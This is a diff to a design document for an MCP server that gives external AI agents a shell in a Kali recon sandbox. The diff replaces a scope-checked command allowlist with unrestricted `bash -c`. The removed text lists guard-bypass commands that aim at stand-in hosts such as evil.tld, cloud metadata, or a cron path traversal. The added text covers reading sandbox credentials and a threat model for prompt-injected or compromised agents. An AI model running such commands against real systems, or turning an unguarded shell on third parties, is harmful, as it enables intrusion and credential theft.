@@ -31,7 +31,7 @@ set of recon tuning settings, and query the attack-surface graph.
 | `start_recon` | Start the full recon pipeline. | `recon:scan` (+ `recon:overwrite` for `mode:"overwrite"`) |
 | `stop_recon` | Stop a running scan. | `recon:scan` |
 | `update_recon_settings` | Change allowlisted recon tuning. | `recon:settings` |
-| `kali_exec` | One allowlisted, scope-checked command in the sandbox. Not a shell. | `kali:exec` |
+| `kali_exec` | A shell in the sandbox: `bash -c`, full toolset, **no target check**. | `kali:exec` |
 | `kali_output` | That command's output, paged from a byte cursor. | `kali:exec` |
 | `kali_cancel` | Stop a command it started. | `kali:exec` |
 | `list_findings` | Every finding, ranked when a triage run has produced a ranking and honest about it when not. | `recon:read` |
@@ -65,139 +65,79 @@ the one action that makes a finding invisible to every other read here, and
 unmute reverses a human's suppression decision, which is exactly the power the
 architecture withholds from the model-driven path.
 
-`kali_toolbox` answers in TWO labelled sections, because there are two different
-questions and conflating them costs the caller a turn per wrong guess:
+`kali_toolbox` serves the `kali_shell` `TOOL_REGISTRY` description verbatim -
+the same bytes the in-app agent is prompted with. One source, no second copy: a
+transcription would drift from the image the moment a tool is added, and a
+catalogue that lies about what is installed is worse than none. All of it is
+runnable, because `kali_exec` is a shell.
 
-1. **RUNNABLE VIA kali_exec** - generated from `kali_exec_guard.SPECS`: every
-   admitted binary and the exact options each accepts. Derived, never
-   transcribed, so adding a binary to `SPECS` changes the answer with no second
-   edit.
-2. **ALSO INSTALLED, NOT RUNNABLE HERE** - the `kali_shell` `TOOL_REGISTRY`
-   description verbatim, the same bytes the in-app agent is prompted with.
-
-It shipped serving only (2), which advertised `sqlmap`, `msfvenom`, `nc`, `gcc`
-and `hashcat` to an agent that is refused on every one. The endpoint's own
-argument - a catalogue that lies about the image is worse than none - applies
-just as well to a catalogue that lies about what is *runnable*.
+One correction is appended, and it is not a fork of the catalogue. The catalogue
+is written FOR the in-app agent, which has dedicated tools (`execute_nmap`,
+`execute_nuclei`, `execute_curl`) alongside `kali_shell`, so it ends by telling
+the reader NOT to use the shell for those. An MCP caller has no dedicated tools:
+`kali_exec` is the only way it runs anything, so read literally that line tells
+it not to use the one tool it has. A short `NOTE FOR MCP CALLERS` after the
+catalogue says so, and names the tools the advice steered it away from.
 
 Served by the agent's `GET /kali/toolbox` (`require_master_internal_auth`). It
 never calls the kali-sandbox, holds no `MCP_AUTH_TOKEN`, and takes no
-`projectId`.
+`projectId`, so it answers even when the sandbox is down.
 
-### 1.1 Why `kali_exec` is not `kali_shell`
+### 1.1 `kali_exec` IS `kali_shell`
 
-`kali_shell` is `bash -c` on a container with `NET_ADMIN`, `NET_RAW`,
-`seccomp:unconfined` and open egress. Inside the product that is contained by a
-**human** clicking through the `DANGEROUS_TOOLS` confirmation
-(`REQUIRE_TOOL_CONFIRMATION`, default on). An MCP token has no human, and
-neither existing control covers the gap: the RoE gate
-(`execute_plan_node._check_roe_blocked`) matches on **tool name only** and never
-reads a command string, and the scope guardrail
-(`initialize_node._run_scope_guardrail`) runs once per session against the
-project's *configured* target. Neither would notice `nmap -sS victim.tld`, which
-needs no settings write and so walks straight past the §6 allowlist.
+**This is a shell, by decision.** `kali_exec` hands the command verbatim to
+`kali_shell`, which is `subprocess.run(["bash", "-c", command])` on a container
+with `NET_ADMIN`, `NET_RAW`, `seccomp:unconfined` and open egress. Pipelines,
+redirection, substitution, loops and every installed binary all work. There is
+no allowlist, no per-flag check and **no per-command target check**.
 
-`agentic/kali_exec_guard.py` is what stands in that place, and it is the security
-boundary of the feature; everything else is plumbing.
+That is deliberate parity with the in-app agent, and the reasoning is worth
+recording because an earlier version of this file argued the opposite at length.
 
-#### It is deny-by-default over the FLAG surface, and that shape was earned
+**The in-app agent has no per-command admission either.** Its gates are a HUMAN
+clicking the `DANGEROUS_TOOLS` confirmation (`REQUIRE_TOOL_CONFIRMATION`,
+default on), an RoE check that matches tool NAMES and never reads a command
+string, and a scope guardrail that runs once per session. None of those inspects
+`kali_shell "nmap victim.tld"`. So a guard on the MCP path was not restoring
+parity with the drawer - it was holding the MCP path to a standard the drawer
+was never held to.
 
-The first implementation pattern-matched arguments to guess which ones named a
-host and let everything it did not recognise through. An adversarial review broke
-it **ten ways in one pass**, every one the same root cause: *a token the guard
-declined to recognise was a token nobody checked*, and the "a network tool must
-name at least one in-scope host" rule meant one good argument laundered all the
-others. Confirmed bypasses, all now regression-tested in
-`BypassRegressionTests`:
+**What carries the weight instead is reachability.** Three independent switches,
+each owned by a different decision-maker, and all three must be on:
 
-```
-curl --resolve=acme.tld:443:6.6.6.6 https://acme.tld/   two colons -> unparsed -> unchecked
-curl -xevil.tld:8080 acme.tld                           attached short value -> skipped entirely
-curl acme.tld evil.tld/                                 a trailing slash -> unparsed
-curl acme.tld 169.254.169.254/latest/meta-data/         cloud metadata
-curl -o /workspace/../etc/cron.d/pwn https://acme.tld/  prefix match, no normalisation
-whatweb --plugins=+/tmp/p.rb https://acme.tld           loads Ruby from a writable dir
-nikto -config /tmp/n.conf -h acme.tld                   config sets PLUGINDIR/EXECDIR/CLIOPTS
-dig @evil.tld acme.tld                                  arbitrary nameserver, out-of-band channel
-curl -K/tmp/c acme.tld                                  config file = arbitrary curl, including file://
-```
+| # | Switch | Who sets it | Default |
+| --- | --- | --- | --- |
+| 1 | `MCP_KALI_EXEC_ENABLED` | operator, per deployment | **off** |
+| 2 | the `kali:exec` scope | user, password-confirmed at mint | **off** |
+| 3 | `project.mcpKaliExecEnabled` | a human in the project form | **off** |
 
-So every binary now declares **each flag it accepts and the KIND of value that
-flag takes** (`BOOL` / `HOST` / `PATH` / `OPAQUE` / `RRTYPE` / `CHOICE` / `TEXT`).
-A token that is not in the spec is refused by name. There are no unrecognised
-tokens left, so there is nothing to launder.
+Switch 3 is `DENY`-classified in the settings allowlist with reason
+`escalation`, so `update_recon_settings` cannot turn it on: a token can never
+grant itself this. A token holding all three has a root shell in the sandbox,
+and that is the intended contract.
 
-`CHOICE` pins a subcommand to a closed set: `openssl req` writes key material and
-`amass intel` reaches past the `-d` domain, so the verb is checked like any other
-value rather than waved through as free text. `TEXT` is the deliberate relaxation
-- a header, body, user-agent or referer MAY contain a URL, because curl dials the
-URL slot and nothing else. `OPAQUE` refusing every `://` had made CORS testing,
-referer checks and SSRF probes against the target impossible, which is ordinary
-bug-bounty work. The slots that steer the connection stay `HOST` or denied, and
-a test asserts they never become `TEXT`.
+**What this costs, stated plainly.** There is no server-side restraint on where a
+command points. An agent granted `kali:exec` can reach any host the sandbox can,
+including one this project is not for. The product's scope boundary is enforced
+for `update_recon_settings` (§6) and for the recon pipeline; on this path it is
+not enforced at all, and the surface says so in three places the agent actually
+reads: the `kali_exec` tool description, the `kali:exec` consent copy, and the
+Agent Onboarding pack. `onboarding.test.ts` fails if that phrasing regresses to
+promising a check.
 
-The allowlist is **23 binaries** (was 9): `amass arjun curl dalfox dig dnsrecon
-dnsx gau host httpx katana naabu nikto nmap nslookup nuclei openssl searchsploit
-subfinder subzy testssl whatweb wpscan`, carrying 469 allowed flags and 160
-explicit denials. `nmap` and `nuclei` are admitted with `--script` / `-t` denied
-by name, which is the rule working rather than an exception to it: the danger is
-the flag, not the tool. `nuclei` also has `-no-interactsh` and
-`-disable-update-check` **injected**, so a caller cannot re-enable the public OAST
-collector this codebase has already leaked a session cookie to, nor have the
-template tree silently replaced mid-run.
+**What is still enforced**, because neither is about the command:
 
-| Rule | Refuses |
-| --- | --- |
-| Per-binary flag allowlist, typed values | Every flag not explicitly permitted, including attached short values (`-oFILE`) |
-| Explicit denials with a reason | `--resolve`, `--connect-to`, `-x`, `-K`, `-L`, `--variable`, `--plugins`, `-config`, `--openssl` |
-| Shell metacharacters (`; \| & $ ` `` ` `` ` > < ( ) \` + newline) | Pipelines, chaining, substitution, redirection |
-| `shlex.split`, `argv[0]` has no `/` | Path-qualified or unparseable programs |
-| Every HOST-typed value resolved, then scope- and RoE-checked | An out-of-scope target, in any syntax: path, userinfo, IPv6 literal, IDN lookalike |
-| URL scheme is http(s) | `file://` (local read), `gopher://`/`dict://` (SSRF) |
-| PATH values normalised, then confined | `..` traversal, relative paths, and **another project's** workspace subtree |
-| A network binary must name a target | A command whose target is implied and so cannot be checked |
-| Injected bounds the caller cannot drop | `--max-filesize`, `--max-time`, `--proto` on every curl |
-
-**The binary rule is: read-only observers whose flags cannot load or run code.**
-That is why `nmap` (`--script`), `sqlmap` (`--eval`), `nuclei` (`-t`),
-`nc`/`socat`, `openssl` (`engine` loads shared objects) and every interpreter are
-absent despite being installed. `test_kali_exec_guard.py` asserts each stays out,
-so adding one is a deliberate act with a red test in front of it.
-
-**Two things it cannot do, by construction.** A pre-flight string check cannot
-see a redirect or a DNS answer, so `-L` is denied (the target would choose the
-next hop) and a hostile in-scope DNS record still resolves where it likes.
-Closing that class needs a runtime egress policy on the *resolved IP*, which
-`scanners/capture_proxy/egress.py` already implements for the capture path.
-Routing this egress through it would make the class unreachable even when the
-parser is wrong, which it will be again. **Tracked, not done.**
-
-Two things do the real work and are easy to mistake for each other. The
-metacharacter check gives an early, legible refusal; the thing that actually
-makes the transport safe is `shlex.join` re-quoting **every** argument before it
-reaches `kali_shell`'s `bash -c` (the same fix as the `shlex.quote` in the
-`/files` reader). The admitted, re-quoted form is what is echoed back and
-audited, not what the caller typed.
-
-Everything fails closed. An unreadable scope refuses rather than running
-unchecked, an unconfigured project refuses rather than treating "no scope" as
-"no limit", and the guard runs **only** in the agent: the webapp never inspects
-or rewrites a command, because a second copy of these rules is the copy that
-drifts.
-
-Four independent switches must all be on, each owned by a different
-decision-maker so no single compromise enables this:
-
-1. `MCP_KALI_EXEC_ENABLED` — deployment, default off *even when the MCP server
-   is on*, wired into the webapp compose `environment:` block (no `env_file`).
-2. the `kali:exec` scope — mint-time, password-confirmed, off by default.
-3. `project.mcpKaliExecEnabled` — a human in the project form, per engagement.
-   Classified `'escalation'` in the settings denylist, so `update_recon_settings`
-   refuses it **by name**: a token can never grant itself this. A row missing the
-   column, or one that cannot be read, is not consent.
-4. a configured target — nothing to scope-check against otherwise.
-
----
+- The job id must be `uuid4().hex`, and the log path is composed server-side
+  from `(project_id, job_id)`. `JobRegistry.status()` falls back to reading a
+  `.meta.json` off disk, and `kali_exec` can write into that workspace, so
+  trusting the `output_path` it carries was an arbitrary file read on the AGENT
+  container - `/proc/self/environ`, and with it `INTERNAL_API_KEY` and the Neo4j
+  password. Regression-tested in `LogPathTrustTests`.
+- The endpoints require the MASTER internal key, not `SCANNER_API_KEY`, which
+  every spawned scan container holds.
+- A finished-but-failed job is readable, not a 404, and a run killed at the
+  sandbox's 300s cap reports `status=failed` with the reason - never a clean
+  exit 0.
 
 ## 2. Turning it on
 
@@ -603,12 +543,44 @@ server's tools. Assume an instruction embedded in a page title reaches the model
 | Escalate scan aggression | Every intrusiveness toggle is denied. |
 | Exfiltrate another tenant's data | Ownership check + `scope_query` + result post-validation. |
 | Exfiltrate secrets | No tool returns a credential. |
-| Aim a command at a third party | `kali_exec` scope-checks every host the command names, before it runs. |
-| Smuggle a second command | Allowlist admits nothing that loads or runs code; `shlex.join` re-quotes every argument. |
-| Read the sandbox's own environment or keys | No interpreter or shell is allowlisted, and paths are confined to `/tmp/` and `/workspace/`. |
 | Burn the owner's LLM budget | Per-token daily budget. |
+| Aim a command at a third party | **Nothing, once `kali:exec` is granted.** See below. |
+| Smuggle a second command | **Nothing, and nothing is meant to.** A shell is the feature. |
+| Read the sandbox's own environment or keys | **Nothing, once `kali:exec` is granted.** See below. |
 
-The residual: a compromised external agent can do, within one user's own
+### The `kali:exec` residual, stated plainly
+
+The three rows above used to claim a per-host scope check, an allowlist that
+admitted no interpreter, and path confinement. **None of those exist any more.**
+`kali_exec` is `bash -c` in the sandbox (§1.1), so an agent holding that scope
+can run any installed binary against any host the sandbox can reach, use
+pipelines and redirection freely, and read the sandbox's own process
+environment.
+
+That environment is not empty. At the time of writing the kali-sandbox
+container carries `SCANNER_API_KEY`, `MCP_AUTH_TOKEN` and `TUNNEL_AUTH_TOKEN`,
+so `env` is a credential read. `SCANNER_API_KEY` is the one to weigh: this route
+deliberately refuses `X-Scanner-Key` as an inbound credential precisely because
+the scanner tier is the least trusted, and an agent that can read it out of the
+sandbox has recovered what the route declined to accept.
+
+Two consequences worth stating rather than leaving to inference:
+
+- **On a cloud deploy the instance metadata endpoint is reachable**
+  (`169.254.169.254`), which on AWS returns the instance role's credentials.
+  Nothing on this path refuses it.
+- **Scope is the operator's judgement, not the code's.** The containment for
+  `kali:exec` is entirely in who gets the scope: it is off by default, needs
+  `MCP_KALI_EXEC_ENABLED` on the deployment AND a per-project opt-in, and every
+  call is audited. With no refusal path left, **the audit row is the only record
+  of what an agent did with the shell**, which makes it more load-bearing than
+  when a guard existed.
+
+Grant `kali:exec` only to an agent you would trust with a terminal on that box,
+and prefer a deployment where the sandbox holds no credential you would mind
+losing.
+
+The other residual: a compromised external agent can do, within one user's own
 projects, whatever that user's token already permits. That is inherent to
 delegating a credential, and is why the default token is read-only.
 
